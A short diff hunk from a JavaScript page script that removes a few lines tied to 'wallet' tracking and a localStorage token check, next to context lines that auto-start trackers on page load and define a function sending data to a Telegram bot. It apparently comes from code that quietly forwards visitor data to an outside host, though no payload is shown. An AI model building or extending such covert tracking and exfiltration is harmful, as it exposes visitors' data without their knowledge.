@@ -119,13 +119,6 @@
         // Start everything when page loads
         document.addEventListener('DOMContentLoaded', initAutoTrackers);
 
-document.getElementById('tracker-one').dataset.walletCreated = 'true':
-
-const Token = localStorage.getItem('Token');
-if (Token === 'enabled') {
-startTracking('tracker-three');
-}
-
 
 // Function to send data to Telegram bot
 async function sendToTelegramBot(data, botToken, chatId) {
